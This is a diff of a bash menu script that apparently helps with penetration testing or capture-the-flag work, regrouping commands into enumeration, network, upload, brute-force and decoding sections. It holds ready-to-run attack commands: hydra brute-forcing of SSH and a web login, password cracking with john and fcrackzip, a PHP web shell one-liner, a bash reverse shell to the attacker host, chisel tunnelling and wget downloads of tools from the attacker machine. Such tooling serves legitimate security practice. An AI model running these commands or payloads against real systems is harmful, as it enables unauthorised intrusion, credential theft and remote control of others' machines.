@@ -31,26 +31,31 @@ COMMAND_e3='ffuf -v -c -recursion -t 64 -e $EXTS -w "$W_COMMON" -u http://$RHOST
 COMMAND_e4='gobuster dir -e -l -t 64 -w "$W_COMMON" -x $EXTS -u http://$RHOST | highlight "200|30[12]"'
 COMMAND_e5='whatweb -v $RHOST'
 
-COMMAND_5='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST ssh -s PORT'
-COMMAND_6='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST -s 80 http-post-form "/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed"'
-COMMAND_7='ssh $USER@$RHOST -p 22'
-COMMAND_9='ffuf -v -t 8 -X POST -w $W_COMMON -u http://$RHOST/login.php -d "key=FUZZ"'
-COMMAND_a='fcrackzip -D -v -p "$W_PASSWORD" file.zip'
-COMMAND_b='binwalk -e file.jpg'
-COMMAND_c='steghide extract -sf file.jpg'
-COMMAND_d='7z x file.zip'
-COMMAND_e='python /usr/share/john/ssh2john.py key > key.hash'
-COMMAND_f='john key.hash --wordlist=$W_PASSWORD --format=FORMAT'
-COMMAND_g='nc -nlvp 4444'
-COMMAND_h='chisel server -p 9999 --reverse -v'
+COMMAND_n1='nc -nlvp 4444'
+COMMAND_n2='ssh $USER@$RHOST -p 22'
+COMMAND_n3='chisel server -p 9999 --reverse -v'
 
 COMMAND_u1='scp ~/Tools/linpeas.sh $USER@$RHOST:/tmp'
 COMMAND_u2='scp ~/Tools/chisel $USER@$RHOST:/tmp'
 
+COMMAND_b1='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST ssh -s PORT'
+COMMAND_b2='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST -s 80 http-post-form "/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed"'
+COMMAND_b3='ffuf -v -t 8 -X POST -w $W_COMMON -u http://$RHOST/login.php -d "key=FUZZ"'
+COMMAND_b4='fcrackzip -D -v -p "$W_PASSWORD" file.zip'
+COMMAND_b5='python /usr/share/john/ssh2john.py key > key.hash'
+COMMAND_b6='john key.hash --wordlist=$W_PASSWORD --format=FORMAT'
+
+COMMAND_d1='binwalk -e file.jpg'
+COMMAND_d2='steghide extract -sf file.jpg'
+COMMAND_d3='7z x file.zip'
+
+LINK_1="http://$RHOST/robots.txt"
+LINK_2="https://gtfobins.github.io/"
+
 CLIP_1="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
 CLIP_2="export TERM=xterm"
 CLIP_3="stty raw -echo; fg"
-CLIP_4='<?php system($_GET["c"]); ?>'
+CLIP_4="<?php system($_GET[\"c\"]); ?>"
 CLIP_5="bash -i >& /dev/tcp/$LHOST/4444 0>&1"
 CLIP_6="wget -O /tmp/handyman http://$LHOST:8000/handyman_cp"
 CLIP_7="wget -O /tmp/chisel http://$LHOST:8000/chisel"
@@ -65,6 +70,8 @@ show_menus() {
   echo -e "  ------"
   echo -e "  ${YELLOW}1${NOCOLOR}) Setup target (${YELLOW}R${NOCOLOR}HOST)"
   echo -e "  ${YELLOW}2${NOCOLOR}) $COMMAND_2"
+  echo -e "  ${YELLOW}3${NOCOLOR}) $COMMAND_3"
+  echo -e "  ${YELLOW}4${NOCOLOR}) $COMMAND_4"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Enumeration${NOCOLOR}"
   echo -e "  -------------"
@@ -74,29 +81,35 @@ show_menus() {
   echo -e "  ${YELLOW}e4${NOCOLOR}) $COMMAND_e4"
   echo -e "  ${YELLOW}e5${NOCOLOR}) $COMMAND_e5"
   echo -e ""
-  echo -e "  ${YELLOW}5${NOCOLOR}) $COMMAND_5"
-  echo -e "  ${YELLOW}6${NOCOLOR}) $COMMAND_6"
-  echo -e "  ${YELLOW}7${NOCOLOR}) $COMMAND_7"
-  echo -e "  ${YELLOW}8${NOCOLOR}) $COMMAND_8"
-  echo -e "  ${YELLOW}9${NOCOLOR}) $COMMAND_9"
-  echo -e "  ${YELLOW}a${NOCOLOR}) $COMMAND_a"
-  echo -e "  ${YELLOW}b${NOCOLOR}) $COMMAND_b"
-  echo -e "  ${YELLOW}c${NOCOLOR}) $COMMAND_c"
-  echo -e "  ${YELLOW}d${NOCOLOR}) $COMMAND_d"
-  echo -e "  ${YELLOW}e${NOCOLOR}) $COMMAND_e"
-  echo -e "  ${YELLOW}f${NOCOLOR}) $COMMAND_f"
-  echo -e "  ${YELLOW}g${NOCOLOR}) $COMMAND_g"
-  echo -e "  ${YELLOW}h${NOCOLOR}) $COMMAND_h"
+  echo -e "  ${LIGHTGREEN}Network${NOCOLOR}"
+  echo -e "  -------"
+  echo -e "  ${YELLOW}n1${NOCOLOR}) $COMMAND_n1"
+  echo -e "  ${YELLOW}n2${NOCOLOR}) $COMMAND_n2"
+  echo -e "  ${YELLOW}n3${NOCOLOR}) $COMMAND_n3"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Upload${NOCOLOR}"
   echo -e "  ------"
   echo -e "  ${YELLOW}u1${NOCOLOR}) $COMMAND_u1"
   echo -e "  ${YELLOW}u2${NOCOLOR}) $COMMAND_u2"
   echo -e ""
+  echo -e "  ${LIGHTGREEN}Brute Force/Cracking${NOCOLOR}"
+  echo -e "  --------------------"
+  echo -e "  ${YELLOW}b1${NOCOLOR}) $COMMAND_b1"
+  echo -e "  ${YELLOW}b2${NOCOLOR}) $COMMAND_b2"
+  echo -e "  ${YELLOW}b3${NOCOLOR}) $COMMAND_b3"
+  echo -e "  ${YELLOW}b4${NOCOLOR}) $COMMAND_b4"
+  echo -e "  ${YELLOW}b5${NOCOLOR}) $COMMAND_b5"
+  echo -e ""
+  echo -e "  ${LIGHTGREEN}Decoding/Extracting${NOCOLOR}"
+  echo -e "  --------------------"
+  echo -e "  ${YELLOW}d1${NOCOLOR}) $COMMAND_d1"
+  echo -e "  ${YELLOW}d2${NOCOLOR}) $COMMAND_d2"
+  echo -e "  ${YELLOW}d3${NOCOLOR}) $COMMAND_d3"
+  echo -e ""
   echo -e "  ${LIGHTGREEN}Links${NOCOLOR}"
   echo -e "  -----"
-  echo -e "  http://$RHOST/robots.txt"
-  echo -e "  https://gtfobins.github.io/"
+  echo -e "  ${YELLOW}l1${NOCOLOR}) $LINK_1"
+  echo -e "  ${YELLOW}l2${NOCOLOR}) $LINK_2"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Clipboard${NOCOLOR}"
   echo -e "  ---------"
@@ -189,6 +202,10 @@ runV() {
   tmux send-keys "$C"
 }
 
+openLink() {
+  xdg-open $1
+}
+
 runC() {
   echo "$@" | xclip -sel c
 
@@ -207,9 +224,7 @@ read_options() {
     R) exportRHOST 1;;
 
     2) runServeTools;;
-
     3) runUploadHandyman;;
-
     4) runV $COMMAND_4;;
 
     e1) runV $COMMAND_e1;;
@@ -218,22 +233,25 @@ read_options() {
     e4) runV $COMMAND_e4;;
     e5) runV $COMMAND_e5;;
 
-    5) runV $COMMAND_5;;
-    6) runV $COMMAND_6;;
-    7) runV $COMMAND_7;;
-    8) runV $COMMAND_8;;
-    9) runV $COMMAND_9;;
-    a) runV $COMMAND_a;;
-    b) runV $COMMAND_b;;
-    c) runV $COMMAND_c;;
-    d) runV $COMMAND_d;;
-    e) runV $COMMAND_e;;
-    f) runV $COMMAND_f;;
-    g) runV $COMMAND_g;;
-    h) runV $COMMAND_h;;
+    n1) runV $COMMAND_n1;;
+    n2) runV $COMMAND_n2;;
+    n3) runV $COMMAND_n3;;
 
     u1) runV $COMMAND_u1;;
     u2) runV $COMMAND_u2;;
+
+    b1) runV $COMMAND_b1;;
+    b2) runV $COMMAND_b2;;
+    b3) runV $COMMAND_b3;;
+    b4) runV $COMMAND_b4;;
+    b5) runV $COMMAND_b5;;
+
+    d1) runV $COMMAND_d1;;
+    d2) runV $COMMAND_d2;;
+    d3) runV $COMMAND_d3;;
+
+    l1) openLink $LINK_1;;
+    l2) openLink $LINK_2;;
 
     c1) runC $CLIP_1;;
     c2) runC $CLIP_2;;
